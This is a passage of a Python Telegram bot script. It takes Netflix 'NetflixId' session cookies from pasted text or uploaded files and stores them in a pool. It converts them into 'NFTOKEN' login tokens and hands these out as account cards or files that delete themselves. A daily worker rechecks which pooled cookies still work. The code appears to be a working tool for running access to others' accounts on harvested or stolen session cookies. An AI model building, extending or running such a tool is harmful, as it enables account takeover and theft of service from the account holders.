                bot.schedule_delete(chat_id, err_msg["message_id"], STATUS_TTL_SECONDS)
                return
        else:
            raw_text = raw_bytes.decode("utf-8", errors="replace")
            cookies = extract_cookie_entries(raw_text, limit=MAX_COOKIES)
    elif text:
        bot.delete_message(chat_id, msg_id)
        cookies = extract_cookie_entries(text, limit=MAX_COOKIES)
    else:
        return

    if not cookies:
        err_msg = bot.send_message(chat_id, "No valid NetflixId cookie found. (Auto-deletes in 10s)")
        bot.schedule_delete(chat_id, err_msg["message_id"], STATUS_TTL_SECONDS)
        return

    if doc or chat_id in REFILL_CHATS:
        REFILL_CHATS.add(chat_id)
        threading.Thread(
            target=_run_refill_async,
            args=(bot, pool, chat_id, cookies),
            daemon=True,
        ).start()
        return

    status_msg = bot.send_message(chat_id, f"Fetching {len(cookies)} token(s)...")
    results, failed = process_cookies(cookies)

    if not results:
        bot.edit_message(chat_id, status_msg["message_id"], f"Done: 0 ok, {failed} failed. (Auto-deletes in 10s)")
        bot.schedule_delete(chat_id, status_msg["message_id"], STATUS_TTL_SECONDS)
        return

    output_text = format_results_text(results)
    bot.edit_message(
        chat_id,
        status_msg["message_id"],
        f"Done: {len(results)} ok, {failed} failed. (Auto-deletes in 10s)",
    )
    bot.schedule_delete(chat_id, status_msg["message_id"], STATUS_TTL_SECONDS)

    if len(results) <= INLINE_LIMIT:
        for url, expires, info in results:
            _send_inline_account_card(bot, chat_id, url, expires, info)
    else:
        output_text = format_results_text(results)
        result_msg = bot.send_document(
            chat_id,
            "NFTOKEN.TXT",
            (output_text + "\n").encode("utf-8"),
            caption=f"{len(results)} token(s) | {failed} failed\nWarning: this file auto-deletes in 10 minutes.",
        )
        bot.schedule_delete(chat_id, result_msg["message_id"], RESULT_TTL_SECONDS)


def _daily_recheck_worker(pool):
    while True:
        last = pool.last_recheck()
        elapsed = time.time() - last if last else RECHECK_INTERVAL_SECONDS
        wait_for = max(60, RECHECK_INTERVAL_SECONDS - elapsed)
        time.sleep(wait_for)
        if pool.count() > 0:
            res = pool.recheck_all()
            if res is not None:
                valid, wasted, errors, remaining = res
                print(
                    f"[24h Recheck] valid={valid} wasted={wasted} net_err={errors} remaining={remaining}",
                    flush=True,
                )


def main():
    token = get_bot_token()
    bot = TelegramBot(token)
    pool = CookiePool(POOL_FILE)

    while True:
        try:
            me = bot.call("getMe")
            break
        except KeyboardInterrupt:
            return
        except Exception as exc:
            print(f"Startup error ({exc}), retrying in 5s...", flush=True)
            time.sleep(5)

    try:
        bot.call(
            "setMyCommands",
            data={
                "commands": json.dumps([
                    {"command": "generate", "description": "Get NFTOKEN from valid pool cookie"},
                    {"command": "refill", "description": "Toggle refill mode to store cookies"},
                    {"command": "pool", "description": "Show stored cookie count"},
                    {"command": "recheck", "description": "Validate all stored cookies now"},
                    {"command": "menu", "description": "Show control buttons"},
                ])
            },
        )
    except Exception:
        pass

    stop_event = threading.Event()

    def _handle_stop(signum, frame):
        stop_event.set()
        try:
            bot.poll_session.close()
        except Exception:
            pass

    signal.signal(signal.SIGINT, _handle_stop)
    if hasattr(signal, "SIGTERM"):
        signal.signal(signal.SIGTERM, _handle_stop)

    threading.Thread(target=_daily_recheck_worker, args=(pool,), daemon=True).start()
    print(
        f"Bot running as @{me.get('username')} (pool: {pool.count()}, max {MAX_COOKIES}/request). Press Ctrl+C to stop.",
        flush=True,
    )

    offset = 0
    while not stop_event.is_set():
        try:
            updates = bot.call(
                "getUpdates",
                data={
                    "offset": offset,
                    "timeout": POLL_TIMEOUT,
                    "allowed_updates": '["message","callback_query"]',
                },
                timeout=POLL_TIMEOUT + 5,
                retries=1,
                use_poll_session=True,
            )
            for update in updates:
                offset = update["update_id"] + 1
                if "callback_query" in update:
                    handle_callback(bot, pool, update["callback_query"])
                elif "message" in update:
                    handle_message(bot, pool, update["message"])
        except KeyboardInterrupt:
            stop_event.set()
            break
        except Exception as exc:
            if stop_event.is_set():
                break
            print(f"Poll error: {exc}", flush=True)
            stop_event.wait(3)

    print("Stopped.", flush=True)


if __name__ == "__main__":
    main()
